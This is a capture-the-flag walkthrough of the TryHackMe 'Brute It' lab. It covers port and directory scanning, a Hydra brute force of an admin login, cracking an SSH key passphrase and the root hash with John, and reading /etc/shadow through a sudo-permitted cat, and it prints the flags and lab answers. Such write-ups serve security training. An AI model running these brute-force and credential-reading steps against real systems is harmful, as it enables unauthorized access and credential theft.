# Brute It Walkthrough
### Link
- https://tryhackme.com/room/bruteit
---
### Taks 2 - Reconnaissance
```
nmap -sC -sC -p- [IP]
```

```
```

**Question**
#### How many ports are open?

**Answer**
###### 2

**Question**
#### What version of SSH is running?

**Answer**
###### OpenSSH 7.6p1

**Question**
#### What version of Apache is running?

**Answer**
###### 2.4.29

**Question**
#### Which Linux distribution is running?

**Answer**
###### Ubuntu

**Question**
#### Search for hidden directories on web server. What is the hidden directory?

```
sudo gobuster dir -u [IP] -w [path]/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/08 20:03:59 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.236.191/admin/]
```

**Answer** 
###### /admin

---
### Taks 3 - Getting a shell



**Question**
#### What is the user:password of the admin panel?

- First: Navigate to the panel. Test few common patterns. Check the source page.
```
 </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>

```

Impotant finding: username is **admin**
- Second: From [IP]/admin, Capture request with Burpsuite
- Third: You can use both BurpSuite or Hydra to find the password
```
sudo hydra -l admin -P [path]/rockyou.txt 10.10.236.19 http-post-form "/admin/:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid"
```
**Answer**
###### xavier

**Question**
####  Web flag

Use the password found  with the username admin to log in.

**Answer**
###### THM{brut3_f0rce_is_e4sy}

**Question**
#### Crack the RSA key you found. What is John's RSA Private Key passphrase?

Now we click on the link **RSA Private key**

On our local machine, we create a file and copy-paste the RSA Private key.

The next step is to crack the key. For this task, we use **john**

```
/usr/share/john/ssh2john.py rsa_private_key > hash 
```

The final step is to use john to brute force the hash

```
john --wordlist=/usr/share/wordlists/rockyou.txt /media/sf_LOLO_Share/TryHackMe/hash                                 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (rsa_private_key)
1g 0:00:00:07 DONE (2021-12-09 19:39) 0.1287g/s 1845Kp/s 1845Kc/s 1845KC/s *7¡Vamos!
Session completed

```

**Answer**
###### rockinroll

**Question**
#### user.txt

Let's SSH the target.

- First: change the permission of the rsa key
```
chmod 600 rsa_private_key
```
- Second:  SSH command
```
sudo ssh -i rsa_private_key john@[IP]
```
- Find the user.txt

**Answer**
###### THM{a_password_is_not_a_barrier}

---
### Taks 4 - Privilege Escalation



**Question**
#### Find a form to escalate your privileges. What is the root's password?

- First: Check what action john can do
```
sudo -l

Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

John can run cat command.

- Second: check [GTFOBins](https://gtfobins.github.io/)

Search **cat**

```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

LFILE=file_to_read
sudo cat "$LFILE"
```

- Third: From the ssh session 
```
john@bruteit:~$ LFILE=/etc/shadow
john@bruteit:~$ sudo cat "$LFILE"
....
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```
- Fourth: Copy/paste the root hash in a file and use john
```
john --wordlist=/usr/share/wordlists/rockyou.txt /media/sf_LOLO_Share/TryHackMe/root_hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)
1g 0:00:00:00 DONE (2021-12-09 20:00) 10.00g/s 1280p/s 1280c/s 1280C/s 123456..diamond
Use the "--show" option to display all of the cracked passwords reliably
Session completed
``` 
**Answer**
###### football

**Question**
#### root.txt

From the ssh session, elevate your privilege as root

```
john@bruteit:~$ su -
Password:
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
**Answer**
###### THM{pr1v1l3g3_3sc4l4t10n}
